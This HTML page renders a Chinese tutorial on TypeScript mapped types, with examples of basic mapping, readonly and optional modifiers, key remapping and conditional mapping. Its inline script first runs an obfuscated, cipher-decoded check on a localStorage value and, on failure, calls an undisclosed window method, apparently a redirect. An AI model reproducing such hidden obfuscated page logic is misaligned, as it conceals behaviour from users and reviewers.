<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x5f03d4=_0x561e;function _0x1f4a(){var s=["WP1IEqPSfCoktNfqkHWEwCkaW5jpf2eOWRSyc2JcRSo7","WPutoSkiWRXpW6n1WRm","aYdcN8kRWOxdT8oOEq","u8osueNcRmk0aSk2yYJcGCoa","W5JcKwBcOw0pW7ldGmkl","W6SPzaXAWOT7WQBdK8kH","f8kRWPqaFgZcO1vAhSk8","W5tcVCkrhbPkW5VcR8oSbeldSq","iNldJmk3WOzUnW","cIldQSopW7JcJmo6xSk9W6hcO0a","fIHNWQJcMcFcMCoBBCkocLu","lmoeW7RdRvFdVvygrCod","W5qFW7VcImkGpaHtW7FdJW","umoxuK/cQCk9lCk3wrNcHSoB","WQ1UiKPG","DruDjmkNW5dcT8kIFqVcU8kd","vxhcR8kWWR/dN8oo","yIpcImoIW5m7zLytmWqxWQ4","W4idjYnJgXddLrGA","WR3cGmk/FKPnW4e0cGjrxW","tCoLWORdUwv4WQ0H","WR7cHmkWC0C+W4yLgsXW","W5FcUCkteXzeWQVcRmo5ox7dIIO","WR0tW7NcVCkLWOyVWQfBvJ1h","W41WW7zKW4P4W6ZcO8kl","BmoEWP06re0Qeq"];return(_0x1f4a=function(){return s})()}function _0x561e(t,s){var p=_0x1f4a();return(_0x561e=function(s,n){var a=p[s-=413];void 0===_0x561e.OdtWVb&&(_0x561e.VhHEVy=function(s,n){var a,l=[],t=0,p="";for(s=(s=>{for(var n,a,l="",t="",p=0,e=0;a=s.charAt(e++);~a&&(n=p%4?64*n+a:a,p++%4)&&(l+=String.fromCharCode(255&n>>(-2*p&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var o=0,r=l.length;o<r;o++)t+="%"+("00"+l.charCodeAt(o).toString(16)).slice(-2);return decodeURIComponent(t)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)t=(t+l[e]+n.charCodeAt(e%n.length))%256,a=l[e],l[e]=l[t],l[t]=a;for(var e=0,t=0,o=0;o<s.length;o++)a=l[e=(e+1)%256],l[e]=l[t=(t+l[e])%256],l[t]=a,p+=String.fromCharCode(s.charCodeAt(o)^l[(l[e]+l[t])%256]);return p},t=arguments,_0x561e.OdtWVb=!0);var s=s+p[0],l=t[s];return l?a=l:(void 0===_0x561e.KrCOlJ&&(_0x561e.KrCOlJ=!0),a=_0x561e.VhHEVy(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x561e,n=_0x1f4a();;)try{if(211282==-parseInt(s(422,"Hkw9"))+parseInt(s(435,"N@eh"))/2*(-parseInt(s(430,"!gHM"))/3)+parseInt(s(416,"N@eh"))/4+parseInt(s(426,"]lGL"))/5+-parseInt(s(428,"]lGL"))/6*(parseInt(s(437,"W3CF"))/7)+parseInt(s(429,"Mla6"))/8+parseInt(s(425,"Cm7%"))/9*(parseInt(s(419,"8MdO"))/10))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x5f03d4(423,"N@eh")](_0x5f03d4(431,"8^yR"))!=_0x5f03d4(421,"py5z"))throw window[_0x5f03d4(427,"pnU8")][_0x5f03d4(415,"bG]5")](_0x5f03d4(433,"%5iO")),Error();document.title="typescript 类型映射",document.getElementById("article").innerHTML='<div><p><strong>TypeScript 类型映射（Mapped Types）</strong>  是一种强大的类型转换工具，它允许开发者基于现有类型创建新的类型，通过遍历已有类型的属性并对其进行转换，从而避免重复代码，提高代码的可维护性。以下是关于 TypeScript 类型映射的详细解析：</p>\n<h3><strong>基本概念</strong></h3>\n<ul>\n<li><strong>定义</strong>  ：类型映射是一种基于现有类型生成新类型的机制，它类似于 JavaScript 中的 <code>map</code> 方法，但针对的是类型而不是值。</li>\n<li><strong>语法</strong>  ：类型映射的基本语法为 <code>type MappedType&lt;OriginalType&gt; = { [Property in keyof OriginalType]: NewType; };</code>。其中，<code>keyof OriginalType</code> 获取 <code>OriginalType</code> 的所有属性名，<code>in</code> 关键字用于遍历这些属性名，<code>NewType</code> 是每个属性被映射到的新类型。</li>\n</ul>\n<h3><strong>主要特性</strong></h3>\n<ol>\n<li><strong>属性转换</strong>  ：\n<ul>\n<li>类型映射可以轻松地将一种类型的属性转换为另一种类型的属性。例如，可以将一个对象类型的所有属性类型更改为布尔值。</li>\n</ul>\n</li>\n<li><strong>修饰符调整</strong>  ：\n<ul>\n<li>TypeScript 提供了 <code>readonly</code> 和 <code>?</code> 修饰符，用于调整属性的可变性和可选性。在类型映射中，可以通过前缀 <code>+</code> 或 <code>-</code> 来添加或移除这些修饰符。</li>\n</ul>\n</li>\n<li><strong>键名重映射</strong>  ：\n<ul>\n<li>TypeScript 4.1 及以上版本引入了 <code>as</code> 关键字，允许在映射过程中创建新的字段名。这通常与模板字面量类型结合使用，以创建基于字符串模式的类型。</li>\n</ul>\n</li>\n<li><strong>条件映射</strong>  ：\n<ul>\n<li>类型映射可以与条件类型结合使用，根据属性的键或现有类型来决定新属性的类型。</li>\n</ul>\n</li>\n</ol>\n<h3><strong>示例</strong></h3>\n<h4><strong>基础映射</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Features</span> = {\n  <span class="hljs-attr">darkMode</span>: <span class="hljs-built_in">boolean</span>;\n  <span class="hljs-attr">notifications</span>: <span class="hljs-built_in">boolean</span>;\n};\n\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">OptionsFlags</span> = { [<span class="hljs-title class_">Property</span> <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Features</span>]: <span class="hljs-built_in">boolean</span> };\n<span class="hljs-comment">// OptionsFlags 等同于 { darkMode: boolean; notifications: boolean; }</span>\n</code></pre>\n<h4><strong>修饰符调整</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Task</span> {\n  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>;\n}\n\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyTask</span> = { <span class="hljs-keyword">readonly</span> [<span class="hljs-title class_">Property</span> <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Task</span>]: <span class="hljs-title class_">Task</span>[<span class="hljs-title class_">Property</span>] };\n<span class="hljs-comment">// ReadonlyTask 等同于 { readonly title: string; readonly completed: boolean; }</span>\n\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">OptionalTask</span> = { [<span class="hljs-title class_">Property</span> <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Task</span>]?: <span class="hljs-title class_">Task</span>[<span class="hljs-title class_">Property</span>] };\n<span class="hljs-comment">// OptionalTask 等同于 { title?: string; completed?: boolean; }</span>\n</code></pre>\n<h4><strong>键名重映射</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;\n  <span class="hljs-attr">location</span>: <span class="hljs-built_in">string</span>;\n}\n\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">LazyPerson</span> = { [<span class="hljs-title class_">Property</span> <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Person</span> <span class="hljs-keyword">as</span> <span class="hljs-string">`get<span class="hljs-subst">${Capitalize&lt;<span class="hljs-built_in">string</span> &amp; Property&gt;}</span>`</span>]: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Person</span>[<span class="hljs-title class_">Property</span>] };\n<span class="hljs-comment">// LazyPerson 等同于 { getName: () =&gt; string; getAge: () =&gt; number; getLocation: () =&gt; string; }</span>\n</code></pre>\n<h4><strong>条件映射</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Options</span> = <span class="hljs-string">&#x27;option1&#x27;</span> | <span class="hljs-string">&#x27;option2&#x27;</span> | <span class="hljs-string">&#x27;option3&#x27;</span>;\n\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">OptionFlags</span> = { [<span class="hljs-title class_">Property</span> <span class="hljs-keyword">in</span> <span class="hljs-title class_">Options</span>]: <span class="hljs-title class_">Property</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;option2&#x27;</span> ? <span class="hljs-built_in">string</span> : <span class="hljs-built_in">number</span> };\n<span class="hljs-comment">// OptionFlags 等同于 { option1: number; option2: string; option3: number; }</span>\n</code></pre>\n<h3><strong>应用场景</strong></h3>\n<ul>\n<li><strong>代码复用</strong>  ：通过类型映射，可以轻松地将一种类型的属性转换为另一种类型，避免重复定义。</li>\n<li><strong>类型安全</strong>  ：类型映射可以在编译时进行类型检查，确保转换后的类型符合预期。</li>\n<li><strong>复杂数据结构</strong>  ：在处理复杂数据结构时，类型映射可以帮助开发者更好地组织和管理类型。</li>\n</ul>\n<h3><strong>总结</strong></h3>\n<p>TypeScript 类型映射是一种强大的类型转换工具，它允许开发者基于现有类型创建新的类型，并通过各种特性和修饰符来调整属性的类型和特性。掌握类型映射可以帮助开发者编写更类型安全、更易于维护的 TypeScript 代码。</p>\n</div>'</script></body></html>